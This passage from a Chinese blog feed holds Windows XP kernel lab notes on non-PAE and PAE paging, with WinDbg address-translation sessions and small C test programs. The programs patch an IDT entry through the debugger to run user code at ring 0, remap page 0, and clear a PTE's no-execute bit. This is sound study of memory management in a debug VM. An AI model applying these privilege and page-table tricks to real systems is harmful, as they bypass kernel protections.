&lt;&lt; 3) + 0xc0000000)</span></span><br><span class="line"><span class="comment">//004197B0</span></span><br><span class="line">DWORD g_var = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;<span class="comment">//裸函数不会帮我们生成栈帧，单纯一个call</span></span><br><span class="line">    *PTE(<span class="number">0</span>) = *PTE(<span class="number">0x04197B0</span>);</span><br><span class="line">    __asm &#123;</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//eq 8003f500  0040ee00`00081040</span></span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&amp;g_var:%p\n&quot;</span>,&amp;g_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>,g_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0:%x\n&quot;</span>,*(DWORD*)<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x7b0:%x\n&quot;</span>,*(DWORD *)<span class="number">0x7b0</span>);</span><br><span class="line">    *(DWORD*)<span class="number">0x7b0</span> = <span class="number">0xffffff</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;g_var:%x\n&quot;</span>,g_var);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;g_var:<span class="number">004197B</span>0</span><br><span class="line">g_var:<span class="number">12345678</span></span><br><span class="line"><span class="number">0</span>:<span class="number">462</span>aabc5</span><br><span class="line"><span class="number">0x7b0</span>:<span class="number">12345678</span></span><br><span class="line">g_var:ffffff</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><p>由于页表项描述的是4k大小页面，所以相当于00419000-0041a000和0-1000处映射到同一块物理页面</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:PAE分页(PAE paging)</title>
      <link href="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/"/>
      <url>/2023/06/02/Windows-Kernel-Experiment-PAE-paging/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-PAE分页-PAE-paging"><a href="#Windows内核实验-PAE分页-PAE-paging" class="headerlink" title="Windows内核实验:PAE分页(PAE paging)"></a>Windows内核实验:PAE分页(PAE paging)</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>时代发展，32位地址总线支持最大4g的物理内存越来越不够用来，就出现了36位地址总线的处理器，理论上支持最大64g的物理内存，为了寻址大于4G的物理内存，出现了PAE分页的方式</p><p>这是一种三级分页的的方式，比二级分页多了一级叫做**页目录指针表PDPT(Page Directory Pointer Table)**的第一级，为了寻址36位地址总线的物理内存，页目录表项(PDE),页表项(PTE),页目录指针(PDPTE)都变为了8字节(4字节只能描述2<sup>32-12</sup>*4kb&#x3D;4G的物理内存，要描述64G至少需要36-12&#x3D;24位来描述页基址，即需要36bit来做表项，干脆对齐8byte算了，所以从理论上是支持2<sup>64-12</sup>*4Kb大小物理内存),这样一个页只能存放4096&#x2F;8&#x3D;512个页表项，所以需要9个位来寻找，页目录项也是如此，就形成了2 9 9 12 分页</p><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602134150946.png" alt="image-20230602134150946"></p><p>NOTES:</p><ul><li>其中M是MAXPHYADDR的缩写(可以理解为地址总线位数)，本例子M&#x3D;36</li><li>CR3只有在intel-64架构有64位</li><li>保留位必须为0</li><li>XD位，如果 IA32_EFER.NXE标志位等于1，该位为1 则该页中的数据(或该项指向的页表中的所有页)不可执行（从该页中获取指令将被禁止；IA32_EFER.NXE等于0，该位位保留位，必须填0</li></ul><blockquote><p>PAE分页时每个进程虚拟内存还是2<sup>2</sup>*2<sup>9</sup>*2<sup>9</sup>*4KB&#x3D;4G，不过系统可使用的总物理内存大了</p></blockquote><h4 id="PAE分页转换过程"><a href="#PAE分页转换过程" class="headerlink" title="PAE分页转换过程"></a>PAE分页转换过程</h4><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602135849354.png" alt="image-20230602135849354"></p><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>依旧是非pae的那个程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0x8c902a0</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; .formats cr4</span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     <span class="number">000006f</span>9</span><br><span class="line">  Decimal: <span class="number">1785</span></span><br><span class="line">  Decimal (<span class="type">unsigned</span>) : <span class="number">1785</span></span><br><span class="line">  Octal:   <span class="number">00000003371</span></span><br><span class="line">  Binary:  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000110</span> <span class="number">11111001</span></span><br><span class="line">  Chars:   ....</span><br><span class="line">  Time:    Thu Jan  <span class="number">1</span> <span class="number">08</span>:<span class="number">29</span>:<span class="number">45</span> <span class="number">1970</span></span><br><span class="line">  Float:   low <span class="number">2.50132e-042</span> high <span class="number">0</span></span><br><span class="line">  Double:  <span class="number">8.81907e-321</span></span><br></pre></td></tr></table></figure><p>cr4第五位pae标志位为1 开启pae</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 815b6020  SessionId: 0  Cid: 0154    Peb: 7ffd3000  ParentCid: 04b8</span><br><span class="line">    DirBase: 08c902a0  ObjectTable: e24c4a90  HandleCount:  17.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.formats 004197B0</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     004197b0</span><br><span class="line">  Decimal: 4298672</span><br><span class="line">  Decimal (unsigned) : 4298672</span><br><span class="line">  Octal:   00020313660</span><br><span class="line">  Binary:  00000000 01000001 10010111 10110000</span><br><span class="line">  Chars:   .A..</span><br><span class="line">  Time:    Fri Feb 20 02:04:32 1970</span><br><span class="line">  Float:   low 6.02372e-039 high 0</span><br><span class="line">  Double:  2.12383e-317</span><br></pre></td></tr></table></figure><p>虚拟地址按照2-9-9-12分页分开</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="comment">//0</span></span><br><span class="line"><span class="number">000000010</span> <span class="comment">//2</span></span><br><span class="line"><span class="number">000011001</span> <span class="comment">//0x19</span></span><br><span class="line"><span class="number">011110110000</span> <span class="comment">//0x7b0</span></span><br></pre></td></tr></table></figure><p>DirBase即为页目录指针表物理地址08c902a0</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 08c902a0 + 0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8c902a0 00000000`0ca6c001 00000000`0ca6d001</span></span><br></pre></td></tr></table></figure><p>得到页目录表物理地址0ca6c000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 0ca6c000 + 8 * 2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca6c010 00000000`0ca7c067 00000000`00000000</span></span><br></pre></td></tr></table></figure><p>得到页表物理地址0ca7c000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 0ca7c000 + 8 * 0x19</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca7c0c8 80000000`0cc1f067 80000000`0cb78067</span></span><br></pre></td></tr></table></figure><p>得到页表项0cc1f000</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !db <span class="number">0</span>cc1f000 + <span class="number">0x7b0</span></span><br><span class="line"># cc1f7b0 <span class="number">78</span> <span class="number">56</span> <span class="number">34</span> <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> xV4.............</span><br></pre></td></tr></table></figure><p>!vtop验证</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!vtop 08c902a0 004197B0</span></span><br><span class="line">X86VtoP: Virt 00000000004197b0, pagedir 0000000008c902a0</span><br><span class="line">X86VtoP: PAE PDPE 0000000008c902a0 - 000000000ca6c001</span><br><span class="line">X86VtoP: PAE PDE 000000000ca6c010 - 000000000ca7c067</span><br><span class="line">X86VtoP: PAE PTE 000000000ca7c0c8 - 800000000cc1f067</span><br><span class="line">X86VtoP: PAE Mapped phys 000000000cc1f7b0</span><br><span class="line">Virtual address 4197b0 translates to physical address cc1f7b0.</span><br></pre></td></tr></table></figure><h2 id="页目录和页表在虚拟内存里的表现"><a href="#页目录和页表在虚拟内存里的表现" class="headerlink" title="页目录和页表在虚拟内存里的表现"></a>页目录和页表在虚拟内存里的表现</h2><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602130747486.png" alt="image-20230602130747486"></p><p>总的大小变为2^2 * 2^9 * 2^9 * 8byte &#x3D; 8Mb 所有页目录移到了0xc060 0000处</p><p>一个页目录指针表项描述4k * 2^9 * 2^9 &#x3D; 1G内存</p><p>一个页目录项描述4k * 2^9 &#x3D; 2M内存 </p><p>一个页表项描述4k内存</p><p>页目录指针不放入虚拟内存(主要是页目录描述的内存太大了，没必要让这么到一块内存的属性放到进程空间里让进程去修改)，其余表计算公式为</p><p>页表项地址&#x3D;((address &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000</p><p>页目录项地址 &#x3D; ((address &gt;&gt; 21) &lt;&lt;3) + 0xc0600000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 815b6020  SessionId: 0  Cid: 0154    Peb: 7ffd3000  ParentCid: 04b8</span><br><span class="line">    DirBase: 08c902a0  ObjectTable: e24c4a90  HandleCount:  17.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 815b6020</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">80528bdc cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=08c902a0</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 800000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV  pfn cc1f      ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">3</span>) + <span class="number">0</span>xc0000000</span></span><br><span class="line">unsigned int 0xc00020c8</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">21</span>) &lt;&lt; <span class="number">3</span>) + <span class="number">0</span>xc0600000</span></span><br><span class="line">unsigned int 0xc0600010</span><br></pre></td></tr></table></figure><p>同时可以看到pte为800000000CC1F067最高位dx为1表示数据不可执行 —DA–UW-V</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq C00020C8 l1</span></span><br><span class="line">c00020c8  80000000`0cc1f067</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 800000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV   pfn cc1f      ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">eq C00020C8 00000000`0cc1f067</span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 000000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV   pfn cc1f      ---DA--UWEV</span><br></pre></td></tr></table></figure><p>可以看到最高位修改为后有了可执行权限E —DA–UWEV</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核实验:非PAE分页(Non-PAE paging)</title>
      <link href="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/"/>
      <url>/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows内核实验-非PAE分页-Non-PAE-paging"><a href="#Windows内核实验-非PAE分页-Non-PAE-paging" class="headerlink" title="Windows内核实验:非PAE分页(Non-PAE paging)"></a>Windows内核实验:非PAE分页(Non-PAE paging)</h1><p><strong>PAE(Physical Address Extension)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p>把原来的noexecute改为execute,来关闭pae</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /execute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p>cr4寄存器的第五位(从0开始)是pae标识位，验证下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.formats cr4</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     000006d9</span><br><span class="line">  Decimal: 1753</span><br><span class="line">  Decimal (unsigned) : 1753</span><br><span class="line">  Octal:   00000003331</span><br><span class="line">  Binary:  00000000 00000000 00000110 11011001</span><br><span class="line">  Chars:   ....</span><br><span class="line">  Time:    Thu Jan  1 08:29:13 1970</span><br><span class="line">  Float:   low 2.45648e-042 high 0</span><br><span class="line">  Double:  8.66097e-321</span><br></pre></td></tr></table></figure><p>第五位是0，没有开启pae</p><h3 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;windows.h&gt;</span></span><br><span class="line">DWORD local_num = 0x12345678;</span><br><span class="line">DWORD g_cr3;</span><br><span class="line">void __declspec(naked) IdtEntry() &#123;//裸函数不会帮我们生成栈帧，单纯一个call</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov g_cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void interrupt() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        int 0x20</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    if (0x401040 != IdtEntry) &#123;</span><br><span class="line">        printf(&quot;IdtRntry address wrong&quot;);</span><br><span class="line">        system(&quot;pause&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    //eq 8003f500  0040ee00`00081040</span><br><span class="line">    interrupt();</span><br><span class="line">    printf(&quot;g_cr3:0x%x\n&quot;, g_cr3);</span><br><span class="line">    printf(&quot;local num address:%p\n&quot;,&amp;local_num);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0xdac000</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><h3 id="物理地址解析过程"><a href="#物理地址解析过程" class="headerlink" title="物理地址解析过程"></a>物理地址解析过程</h3><p>windbg</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span> test.exe</span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS <span class="number">81398480</span>  SessionId: <span class="number">0</span>  Cid: <span class="number">01e4</span>    Peb: <span class="number">7f</span>fd9000  ParentCid: <span class="number">04</span>a8</span><br><span class="line">    DirBase: <span class="number">00</span>dac000  ObjectTable: e2571638  HandleCount:  <span class="number">15.</span></span><br><span class="line">    Image: test.exe</span><br></pre></td></tr></table></figure><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601151108340.png" alt="image-20230601151108340"></p><p>dirbase就是页目录地址基址，就是cr3里的值 ps: PDBR(Page Directory Base Register)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.formats 004197B0</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     004197b0</span><br><span class="line">  Decimal: 4298672</span><br><span class="line">  Decimal (unsigned) : 4298672</span><br><span class="line">  Octal:   00020313660</span><br><span class="line">  Binary:  00000000 01000001 10010111 10110000</span><br><span class="line">  Chars:   .A..</span><br><span class="line">  Time:    Fri Feb 20 02:04:32 1970</span><br><span class="line">  Float:   low 6.02372e-039 high 0</span><br><span class="line">  Double:  2.12383e-317</span><br></pre></td></tr></table></figure><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601152207229.png" alt="image-20230601152207229"></p><p>004197B0就是我们的线性地址，按照经典二级页表分开</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="number">01</span> <span class="comment">//0x1</span></span><br><span class="line"><span class="number">000001</span> <span class="number">1001</span> <span class="comment">//0x19</span></span><br><span class="line"><span class="number">0111</span> <span class="number">10110000</span> <span class="comment">//0x7B0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">0xdac000</span></span><br><span class="line">#  dac000 <span class="number">0303</span>a067 <span class="number">00899067</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure><blockquote><p>windbg 前面加个! 查看物理内存</p></blockquote><p>第一项找到页目录项 00899067，后面三位是属性位，页表地址为00899000</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">00899000</span> + <span class="number">0x19</span>*<span class="number">4</span></span><br><span class="line">#  <span class="number">899064</span> <span class="number">0025f</span>067 <span class="number">00861067</span> <span class="number">00004025</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure><p>找到页表项PTE 0025f067 同样后面三位是属性，物理基地址为0025f000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!db 0025f000 + 0x7B0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 25f7b0 78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00 xV4.............</span></span><br></pre></td></tr></table></figure><p>windbg提供了<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/-vtop">!vtop</a>扩展将虚拟地址转换为相应的物理地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">!vtop PFN VirtualAddress </span><br><span class="line">PFN</span><br><span class="line">Specifies the page frame <span class="title function_">number</span> <span class="params">(PFN)</span> of the directory base <span class="keyword">for</span> the process.</span><br><span class="line">VirtualAddress</span><br><span class="line">Specifies the virtual address whose page is desired.</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !vtop <span class="number">0xdac</span> <span class="number">004197B</span>0</span><br><span class="line">X86VtoP: Virt <span class="number">00000000004197b</span>0, pagedir <span class="number">0000000000</span>dac000</span><br><span class="line">X86VtoP: PDE <span class="number">0000000000</span>dac004 - <span class="number">00899067</span></span><br><span class="line">X86VtoP: PTE <span class="number">0000000000899064</span> - <span class="number">0025f</span>067</span><br><span class="line">X86VtoP: Mapped phys <span class="number">000000000025f</span>7b0</span><br><span class="line">Virtual address <span class="number">4197b</span>0 translates to physical address <span class="number">25f</span>7b0.</span><br></pre></td></tr></table></figure><h3 id="查看进程低2G内存"><a href="#查看进程低2G内存" class="headerlink" title="查看进程低2G内存"></a>查看进程低2G内存</h3><p>直接d来的低2g，由于系统有很多进程，dbg不知道读哪个</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; db <span class="number">004197B</span>0</span><br><span class="line"><span class="number">004197b</span>0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????</span><br><span class="line"><span class="number">004197</span>c0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????</span><br></pre></td></tr></table></figure><p>可以.process 81398480</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process 81398480</span></span><br><span class="line">ReadVirtual: 81398498 not properly sign extended</span><br><span class="line">Implicit process is now 81398480</span><br><span class="line">WARNING: .cache forcedecodeuser is not enabled</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">db 004197B0</span></span><br><span class="line">004197b0  78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00  xV4.............</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=00039000</span><br></pre></td></tr></table></figure><p>但是他的cr3还是原来的，可能自己有时候不注意导致一些不必要的麻烦</p><p>最好.process &#x2F;i 81398480(&#x2F;i 将调试器的当前进程切换到指定进程映像路径对应的进程) 然后g一下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 81398480</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">804e4592 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=00dac000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">db 004197B0</span></span><br><span class="line">004197b0  78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00  xV4.............</span><br></pre></td></tr></table></figure><h3 id="页目录和页表在虚拟内存里的表"><a href="#页目录和页表在虚拟内存里的表" class="headerlink" title="页目录和页表在虚拟内存里的表"></a>页目录和页表在虚拟内存里的表</h3><blockquote><p>CR3中存储的是物理地址，不能在程序中直接读取的。如果想读取，也要把Cr3的值挂到PDT和PTT中才能访问，那么怎么通过线性地址访问PDT和PTT呢？</p><p>有了固定地址，这样我们就可以通过线性地址来访问页目录和页表，方便维护 似乎32位系统大部分这样实现</p></blockquote><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601202830592.png" alt="image-20230601202830592"></p><p>页目录表是放在0xc0300000处，二级页表前3g是从0xc0000000处，后面1G是从0xc030 0000开始</p><blockquote><p>这里我觉的一个比较巧妙的点是，中间的4k的页目录表</p><p>首先0xc000 0000是虚拟内存3G的起点，页目录表是从0xc0300000开始占4k，相当于虚拟地址3G开始处的4M不用描述，这个4M正好是所有页表的总大小</p></blockquote><p>所有从虚拟地址addr得到他的页表项虚拟地址公式为 ((addr &gt;&gt; 12) &lt;&lt; 2) + 0xc0000000</p><blockquote><p>&gt;&gt;12相当于除以page大小4k算出index(因为一个页表项描述4k大小物理内存)，&lt;&lt;2一个页表项4byte</p></blockquote><p>页目录项虚拟地址公式为 ((addr &gt;&gt; 22) &lt;&lt;2) + 0xc0300000</p><blockquote><p>&gt;&gt;22除以4M(因为一个页目录项描述4M内存)</p></blockquote><p><strong>调试</strong></p><p>手残。。，把原来的test.exe关了,现在cr3是下面的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0x1fcc000</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 8162dc30  SessionId: 0  Cid: 00c8    Peb: 7ffd6000  ParentCid: 04a4</span><br><span class="line">    DirBase: 01fcc000  ObjectTable: e2436230  HandleCount:  15.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 8162dc30</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">ntStatus=0Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">804e4592 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=01fcc000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!vtop 1fcc 004197B0</span></span><br><span class="line">X86VtoP: Virt 00000000004197b0, pagedir 0000000001fcc000</span><br><span class="line">X86VtoP: PDE 0000000001fcc004 - 007f3067</span><br><span class="line">X86VtoP: PTE 00000000007f3064 - 0c889067</span><br><span class="line">X86VtoP: Mapped phys 000000000c8897b0</span><br><span class="line">Virtual address 4197b0 translates to physical address c8897b0.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!db c8897b0 l8</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c8897b0 78 56 34 12 00 00 00 00 xV4......EN.....</span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                 VA 004197b0</span><br><span class="line">PDE at C0300004         PTE at C0001064</span><br><span class="line">contains 007F3067       contains 0C889067</span><br><span class="line">pfn 7f3   ---DA--UWEV   pfn c889  ---DA--UWEV</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">2</span>) + <span class="number">0</span>xc0000000</span></span><br><span class="line">unsigned int 0xc0001064</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dd <span class="number">0</span>xc0001064</span> 